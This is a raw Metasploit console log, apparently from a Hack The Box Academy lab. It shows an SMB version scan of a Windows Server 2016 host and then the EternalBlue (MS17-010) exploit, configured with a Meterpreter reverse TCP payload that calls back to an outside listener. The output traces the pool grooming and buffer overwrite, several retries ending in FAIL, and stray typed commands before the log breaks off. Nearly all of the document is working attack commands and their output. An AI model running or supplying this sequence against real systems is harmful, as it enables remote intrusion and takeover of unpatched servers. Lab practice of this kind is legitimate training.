
┌─[eu-academy-4]─[10.10.14.91]─[htb-ac-1325477@htb-ru32p3jfkh]─[~]
└──╼ [★]$ msfconsole -q
[msf](Jobs:0 Agents:0) >> use auxiliary/scanner/smb/smb_version
[msf](Jobs:0 Agents:0) auxiliary(scanner/smb/smb_version) >> set RHOSTS 10.129.153.188
RHOSTS => 10.129.153.188
[msf](Jobs:0 Agents:0) auxiliary(scanner/smb/smb_version) >> run

[*] 10.129.153.188:445    - SMB Detected (versions:1, 2, 3) (preferred dialect:SMB 3.1.1) (compression capabilities:) (encryption capabilities:AES-128-GCM) (signatures:optional) (uptime:55m 46s) (guid:{96c71851-8687-44e4-836a-4302c9d8924a}) (authentication domain:MSF1-WIN01)Windows 2016 Standard (build:14393) (name:MSF1-WIN01) (workgroup:WORKGROUP)
[+] 10.129.153.188:445    -   Host is running SMB Detected (versions:1, 2, 3) (preferred dialect:SMB 3.1.1) (compression capabilities:) (encryption capabilities:AES-128-GCM) (signatures:optional) (uptime:55m 46s) (guid:{96c71851-8687-44e4-836a-4302c9d8924a}) (authentication domain:MSF1-WIN01)Windows 2016 Standard (build:14393) (name:MSF1-WIN01) (workgroup:WORKGROUP)
[*] 10.129.153.188:       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
[msf](Jobs:0 Agents:0) auxiliary(scanner/smb/smb_version) >> use exploit/windows/smb/ms17_010_eternalblue
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) >> set RHOSTS 10.129.153.188
RHOSTS => 10.129.153.188
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) >> set PAYLOAD windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) >> options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS         10.129.153.188   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-
                                             metasploit.html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 20
                                             08 R2, Windows 7, Windows Embedded Standard 7 target machines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R
                                             2, Windows 7, Windows Embedded Standard 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows
                                              7, Windows Embedded Standard 7 target machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     94.237.43.61     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.

[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) >> exploit

[*] Started reverse TCP handler on 94.237.43.61:4444 
[*] 10.129.153.188:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.129.153.188:445    - Host is likely VULNERABLE to MS17-010! - Windows Server 2016 Standard 14393 x64 (64-bit)
[*] 10.129.153.188:445    - Scanned 1 of 1 hosts (100% complete)
[+] 10.129.153.188:445 - The target is vulnerable.
[*] 10.129.153.188:445 - Connecting to target for exploitation.
[+] 10.129.153.188:445 - Connection established for exploitation.
[+] 10.129.153.188:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.129.153.188:445 - CORE raw buffer dump (34 bytes)
[*] 10.129.153.188:445 - 0x00000000  57 69 6e 64 6f 77 73 20 53 65 72 76 65 72 20 32  Windows Server 2
[*] 10.129.153.188:445 - 0x00000010  30 31 36 20 53 74 61 6e 64 61 72 64 20 31 34 33  016 Standard 143
[*] 10.129.153.188:445 - 0x00000020  39 33                                            93              
[+] 10.129.153.188:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.129.153.188:445 - Trying exploit with 12 Groom Allocations.
[*] 10.129.153.188:445 - Sending all but last fragment of exploit packet
[*] 10.129.153.188:445 - Starting non-paged pool grooming
[+] 10.129.153.188:445 - Sending SMBv2 buffers
[+] 10.129.153.188:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.129.153.188:445 - Sending final SMBv2 buffers.
[*] 10.129.153.188:445 - Sending last fragment of exploit packet!
[*] 10.129.153.188:445 - Receiving response from exploit packet
[+] 10.129.153.188:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.129.153.188:445 - Sending egg to corrupted connection.
[*] 10.129.153.188:445 - Triggering free of corrupted buffer.
whoami
[*] Sending stage (200774 bytes) to 143.198.3.113
[-] 10.129.153.188:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 10.129.153.188:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=FAIL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 10.129.153.188:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] 10.129.153.188:445 - Connecting to target for exploitation.
[+] 10.129.153.188:445 - Connection established for exploitation.
[+] 10.129.153.188:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.129.153.188:445 - CORE raw buffer dump (34 bytes)
[*] 10.129.153.188:445 - 0x00000000  57 69 6e 64 6f 77 73 20 53 65 72 76 65 72 20 32  Windows Server 2
[*] 10.129.153.188:445 - 0x00000010  30 31 36 20 53 74 61 6e 64 61 72 64 20 31 34 33  016 Standard 143
[*] 10.129.153.188:445 - 0x00000020  39 33                                            93              
[+] 10.129.153.188:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.129.153.188:445 - Trying exploit with 17 Groom Allocations.
[*] 10.129.153.188:445 - Sending all but last fragment of exploit packet
[*] 10.129.153.188:445 - Starting non-paged pool grooming
[+] 10.129.153.188:445 - Sending SMBv2 buffers
[+] 10.129.153.188:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.129.153.188:445 - Sending final SMBv2 buffers.
[*] 10.129.153.188:445 - Sending last fragment of exploit packet!
[*] 10.129.153.188:445 - Receiving response from exploit packet
[+] 10.129.153.188:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.129.153.188:445 - Sending egg to corrupted connection.
[*] 10.129.153.188:445 - Triggering free of corrupted buffer.
[-] 10.129.153.188:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 10.129.153.188:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=FAIL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 10.129.153.188:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] 10.129.153.188:445 - Connecting to target for exploitation.
[+] 10.129.153.188:445 - Connection established for exploitation.
[+] 10.129.153.188:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.129.153.188:445 - CORE raw buffer dump (34 bytes)
[*] 10.129.153.188:445 - 0x00000000  57 69 6e 64 6f 77 73 20 53 65 72 76 65 72 20 32  Windows Server 2
[*] 10.129.153.188:445 - 0x00000010  30 31 36 20 53 74 61 6e 64 61 72 64 20 31 34 33  016 Standard 143
[*] 10.129.153.188:445 - 0x00000020  39 33                                            93              
[+] 10.129.153.188:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.129.153.188:445 - Trying exploit with 22 Groom Allocations.
[*] 10.129.153.188:445 - Sending all but last fragment of exploit packet
[*] 10.129.153.188:445 - Starting non-paged pool grooming
[+] 10.129.153.188:445 - Sending SMBv2 buffers
[+] 10.129.153.188:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.129.153.188:445 - Sending final SMBv2 buffers.
[*] 10.129.153.188:445 - Sending last fragment of exploit packet!
[*] 10.129.153.188:445 - Receiving response from exploit packet
[+] 10.129.153.188:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.129.153.188:445 - Sending egg to corrupted connection.
[*] 10.129.153.188:445 - Triggering free of corrupted buffer.
sysinf[-] 10.129.153.188:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 10.129.153.188:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=FAIL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 10.129.153.188:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
o
